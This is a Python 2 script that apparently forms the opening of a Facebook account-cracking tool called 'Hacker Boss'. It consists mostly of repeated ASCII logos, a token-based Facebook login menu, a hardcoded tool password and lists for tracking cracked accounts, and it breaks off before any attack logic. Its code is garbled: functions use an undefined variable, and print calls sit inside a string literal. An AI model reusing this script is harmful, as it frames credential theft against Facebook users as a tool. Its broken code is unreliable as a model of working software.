#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To boss
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;96m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'
R='\033[1;94m'

#Dev: Hacker
##### LOGO #####
logo = """
\033[1;97m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;97m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;97m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;97m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;97m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;97m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  Boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo2 = """
\033[1;96m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;96m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;96m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;96m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;96m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;96m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo3 = """
\033[1;96m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;96m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;96m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;96m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;96m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;96m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo4 = """
\033[1;95m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;95m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;95m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;95m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;95m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;95m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo5 = """
\033[1;94m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;94m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;94m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;94m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;94m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;94m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo6 = """
\033[1;95m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;95m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;95m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;95m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;95m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;95m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo7 = """
\033[1;96m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;96m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;96m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;96m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;96m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;96m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo8 = """
\033[1;97m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;97m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;97m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;97m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;97m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;97m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo11 = """
\033[1;94m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;94m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;94m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;94m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;94m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;94m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

====================================
====================================

"""
logo12 = """
\033[1;93m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;93m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;93m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;93m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;93m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;93m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo13 = """
\033[1;93m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;93m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;93m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;93m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;93m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;93m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo14 = """
\033[1;93m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;93m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;93m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;93m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;93m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;93m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo15 = """
\033[1;93m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;93m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;93m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;93m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;93m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;93m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo16 = """
\033[1;93m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;93m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;93m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;93m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;93m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;93m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo17 = """
\033[1;93m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;93m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;93m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;93m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;93m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;93m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo18 = """
\033[1;93m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;93m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;93m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;93m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;93m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;93m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo19 = """
\033[1;93m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;93m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;93m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;93m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;93m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;93m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo20 = """
\033[1;93m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;93m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;93m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;93m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;93m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;93m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo21 = """	
\033[1;93m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;93m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;93m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;93m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;93m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;93m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo22 = """
\033[1;93m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;93m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;93m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;93m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;93m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;93m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo23 = """
\033[1;93m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;93m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;93m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;93m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;93m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;93m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""
logo24 = """
\033[1;93m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;93m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;93m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;93m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;93m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;93m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)


"""
logo25 = """
\033[1;93m╭╮╱╭╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭━━╮
\033[1;93m┃┃╱┃┃╱╱╱╱╱┃┃╱╱╱╱╱╱╱┃╭╮┃
\033[1;93m┃╰━╯┣━━┳━━┫┃╭┳━━┳━╮┃╰╯╰┳━━┳━━┳━━╮
\033[1;93m┃╭━╮┃╭╮┃╭━┫╰╯┫┃━┫╭╯┃╭━╮┃╭╮┃━━┫━━┫
\033[1;93m┃┃╱┃┃╭╮┃╰━┫╭╮┫┃━┫┃╱┃╰━╯┃╰╯┣━━┣━━┃
\033[1;93m╰╯╱╰┻╯╰┻━━┻╯╰┻━━┻╯╱╰━━━┻━━┻━━┻━━╯

\033[1;91m--> GITHUB :- https://github.com/Hackerboss

\033[1;92m--> FACEBOOK :- Shan Noor

\033[1;93m--> YOUTUBE :-  boss

\033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use

\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)

"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;91mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

\033[1;92m======================================

print "\033[1;96m•◈•───────────────•◈•\033[1;92mHACKER♡BOSS\033[1;96m•◈•───────────────•◈•"
jalan("    \033[1;93m┳┻┳┻▇▇▇▇▇▇     ╭━━━━╮╱▔▔▔╲      ▇▇▇▇▇▇┳┻┳┻┳┻")
jalan("    \033[1;93m┻┳┻┳▇▇▇▇▇▇     ┃╯╯╭━┫▏╰╰╰▕      ▇▇▇▇▇▇┻┳┻┳┻┳")
jalan("    \033[1;93m┳┻┳┻▇▇▇▇▇▇     ┃╯╯┃▔╰┓▔▂▔▕╮     ▇▇▇▇▇▇┳┻┳┻┳┻")
jalan("    \033[1;93m┻┳┻┳▇▇▇▇▇▇     ╰╮╯┃┈╰┫╰━╯┏╯     ▇▇▇▇▇▇┻┳┻┳┻┳")
jalan("    \033[1;93m┳┻┳┻▇▇▇▇▇▇     ┏╯╯┃╭━╯┳━┳╯      ▇▇▇▇▇▇┻┳┻┳┻┳")
jalan("    \033[1;93m┻┳┻┳▇▇▇▇▇▇     ╰━┳╯▔╲╱▔╭╮▔╲     ▇▇▇▇▇▇┳┻┳┻┳┻")
jalan("    \033[1;93m┳┻┳┻▇▇▇▇▇▇   ┃┈╲┈╲╱╭╯╮▕     ▇▇▇▇▇▇┻┳┻┳┻┳")
jalan("    \033[1;93m┻┳┻┳▇▇▇▇▇▇       ┃┈▕╲▂╱┈╭╯╱     ▇▇▇▇▇▇┳┻┳┻┳┻")
jalan("    \033[1;93m┳┻┳┻▇▇▇▇▇▇       ┃'''┈┃┈┃┈'''   ▇▇▇▇▇▇┻┳┻┳┻┳")
jalan("    \033[1;93m┻┳┻┳▇▇▇▇▇▇     ┏╯▔'''╰┓┣━┳┫     ▇▇▇▇▇▇┳┻┳┻┳┻")
jalan("    \033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
jalan("    \033[1;93m▇▇\033[1;95m           WellCome to Hacker Boss     \033[1;93m▇▇")
jalan("    \033[1;93m▇▇\033[1;91m              👇  AUTHOR  👇          \033[1;93m▇▇")
jalan("    \033[1;93m▇▇\033[1;92m          This Tools Is Created By    \033[1;93m▇▇")
jalan("    \033[1;93m▇▇\033[1;92m                Hacker Boss         \033[1;93m▇▇")
jalan("    \033[1;93m▇▇\033[1;92m       Whatsaap  03155538375   \033[1;93m▇▇")
jalan("    \033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")


\033[1;96m-------------------

"""

CorrectUsername = "Hacker"
CorrectPassword = "Boss"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m\x1b[1;97mTool Username \x1b[1;97m------- \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m\x1b[1;97mTool Password  \x1b[1;97m------- \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCQdBT_TMMD3l6CrS6JxiUSQ')
    else:
        print "\033[1;91mWrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCQdBT_TMMD3l6CrS6JxiUSQ')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
	####login#########
def login():
	os.system('clear')
	print logo11
	print "1.\x1b[1;95mLogin  Facebook  "
        time.sleep(0.05)
        print "2.\x1b[1;95mWhat is acces Token How To Get Acces Token Free"
        time.sleep(0.05)
        print "3.\x1b[1;95mLogin Using Token"
        time.sleep(0.05)
	print "0.\033[1;95mExit           "
	pilih_login()
	
def pilih_login():
